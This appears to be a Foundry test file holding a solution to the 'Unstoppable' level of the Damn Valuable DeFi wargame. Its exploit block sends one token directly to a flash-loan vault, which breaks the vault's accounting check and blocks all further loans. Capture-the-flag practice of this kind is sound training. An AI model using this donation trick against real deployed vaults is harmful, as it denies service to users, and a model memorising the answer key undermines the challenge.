// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableVault} from "../../../src/Contracts/unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 internal constant INITIAL_PLAYER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableVault internal vault;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal owner;
    address payable internal player;
    address payable internal someUser;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);
        owner = users[0];
        player = users[1];
        someUser = users[1];
        vm.label(owner, "Owner");
        vm.label(someUser, "User");
        vm.label(player, "Player");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        vault = new UnstoppableVault(dvt, owner, owner);
        vm.label(address(vault), "Unstoppable Vault");

        assertEq(address(vault.asset()), address(dvt));

        dvt.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, owner);

        assertEq(dvt.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(dvt)) ,TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(dvt), TOKENS_IN_VAULT - 1),0);
        assertEq(vault.flashFee(address(dvt), TOKENS_IN_VAULT)
        ,50000 * 10** 18);
        

        dvt.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(vault)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(100e18);
        vm.stopPrank();
        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

         vm.startPrank(player);

         dvt.transfer(address(vault), 1);

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
